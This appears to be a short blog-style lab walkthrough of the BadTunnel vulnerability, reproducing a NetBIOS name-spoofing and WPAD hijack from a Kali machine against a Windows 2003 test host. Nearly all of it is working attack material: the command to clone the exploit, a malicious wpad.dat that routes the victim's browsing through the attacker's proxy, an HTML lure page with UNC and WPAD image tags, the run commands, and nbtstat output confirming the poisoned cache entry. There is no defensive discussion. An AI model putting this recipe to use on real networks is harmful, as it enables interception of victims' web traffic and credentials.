---
title: BadTunnel Vulnerability
date: 2016-06-22 15:25:29
type: "BadTunnel"
---


#### Test Environment
```
Kali    10.0.5.9
Windows2003     10.0.5.100
```
#### Download EXP

[BadTunnel](https://github.com/T3rry7f/BadTunnel_exp)
```
> git clone https://github.com/T3rry7f/BadTunnel_exp    #save to www filepath
```
[HttpProxy](https://raw.githubusercontent.com/Anorov/PySocks/master/test/httpproxy.py)
```
> wget https://raw.githubusercontent.com/Anorov/PySocks/master/test/httpproxy.py  #edit app.listen(port, address="0.0.0.0")
```

#### Step
> vi wpad.dat

```
function FindProxyForURL(url, host) {
      // URLs within this network are accessed directly
      if (isInNet(host, "127.0.0.1", "255.255.255.0"))
      {
         return "DIRECT";
      }
      return "PROXY 10.0.5.9:8081; DIRECT";
   }
```
> vi badtunnel_test.html

```
<html>

<img src="\\10.0.5.9\BadTunnel">

<img src="http://WPAD/wpad.dat">

</html>
```

```
> python httpproxy.py
> python badtunnel.py 10.0.5.9
```
settings ie proxy "Automatic check setting",then
Using ie browser open site http://10.0.5.9/badtunnel_test.html

Windows dos views
```
C:\Documents and Settings\Administrator> nbtstat -c
```
```
本地连接:
Node IpAddress: [10.0.5.100] Scope Id: []

                  NetBIOS Remote Cache Name Table

        Name              Type       Host Address    Life [sec]
    ------------------------------------------------------------
    WPAD           <00>  UNIQUE          10.0.5.9            352
```


